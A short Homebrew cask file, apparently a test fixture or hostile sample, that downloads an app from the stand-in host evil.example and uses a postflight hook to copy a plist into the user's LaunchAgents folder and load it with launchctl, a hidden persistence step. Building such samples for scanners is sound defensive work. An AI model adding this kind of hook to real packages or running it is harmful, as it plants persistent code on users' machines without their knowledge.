cask "evil-launchd" do
  version "1.0"
  sha256 "6666666666666666666666666666666666666666666666666666666666666666"
  url "https://evil.example/app.dmg"
  app "Evil.app"
  postflight do
    system_command "/bin/cp", args: ["#{staged_path}/agent.plist", "#{Dir.home}/Library/LaunchAgents/com.evil.agent.plist"]
    system_command "/bin/launchctl", args: ["load", "#{Dir.home}/Library/LaunchAgents/com.evil.agent.plist"]
  end
end
